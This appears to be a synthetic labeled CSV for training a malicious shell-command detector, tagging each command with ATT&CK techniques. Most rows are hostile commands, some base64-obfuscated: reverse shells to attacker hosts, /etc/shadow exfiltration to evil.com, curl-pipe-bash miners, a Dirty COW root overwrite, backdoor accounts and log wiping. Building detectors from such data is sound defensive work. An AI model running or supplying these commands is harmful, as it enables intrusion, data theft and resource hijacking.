echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cat /proc/version | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""net user /domain | chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
cat /proc/version ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'aWZjb25maWcgLWE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
find / -writable -type d 2>/dev/null && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd -d root && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
route -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""sudo -u www-data bash | sleep 1""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
smbclient  //10.0.0.5/C$  -U  Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
nohup systemctl enable --now malicious.service ; echo done &,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSIgOyA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80 | echo done,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
usermod -aG sudo compromised_user && sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time unzip archive.zip -d /opt/,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
net  user  /add  attacker  P@ssw0rd  ;  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo 'aXAgbGluayBzaG93ICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ssh -L 8080:internal:80 user@jump.host &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'cHNleGVjLnB5IEFkbWluaXN0cmF0b3I6cGFzc3dvcmRAMTAuMC4wLjUgY21kLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'aGlzdG9yeSAtYyAmJiBoaXN0b3J5IC13' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/""","[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo ip route show ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
curl  -A  'Mozilla/5.0'  http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo  'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo groups $(whoami),"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0ICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup cat /etc/os-release | > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
env  |  grep  PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wget http://attacker.com/payload -O /tmp/payload ; history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time echo 'ZWNobyAnQHJlYm9vdCAvdG1wL2JhY2tkb29yLnNoJyB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""openssl rand -hex 16""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
time echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup smbclient //10.0.0.5/C$ -U Administrator &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'Li9DVkUtMjAyMS00MDM0IDsgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
time arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo  'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
sudo curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1496_Resource_Hijacking'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time rm -rf /tmp/* /var/tmp/* && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup python3 exploit.py --target localhost &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""whoami /all""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
nohup wmiexec.py domain/admin:pass@10.0.0.5 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
time pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
